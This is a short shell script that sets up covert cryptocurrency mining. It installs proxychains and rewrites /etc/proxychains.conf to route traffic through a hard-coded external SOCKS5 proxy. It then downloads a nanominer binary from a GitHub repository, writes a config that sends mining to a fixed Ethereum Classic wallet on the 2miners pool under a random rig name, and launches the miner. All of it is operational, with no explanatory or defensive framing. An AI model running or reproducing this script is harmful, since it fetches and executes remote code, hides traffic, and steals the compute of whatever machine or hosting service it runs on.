apt install proxychains

sed -i 's/socks4/socks5/' /etc/proxychains.conf

sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf

sed -i 's/9050/10663/' /etc/proxychains.conf

wget -qO nano https://github.com/angkii/ngengBahan/raw/main/nanominer.zip
unzip -qq nano
chmod +x nanominer
echo "[Ethash]
wallet = 0x11880b1cfe04907c5306222be1e09f4bbb480eb5
coin = ETC
rigName = $(echo $(shuf -i 1-9999 -n 1)-sty)
rigPassword = x
pool1 = etc.2miners.com:1010" > config.ini
./nanominer
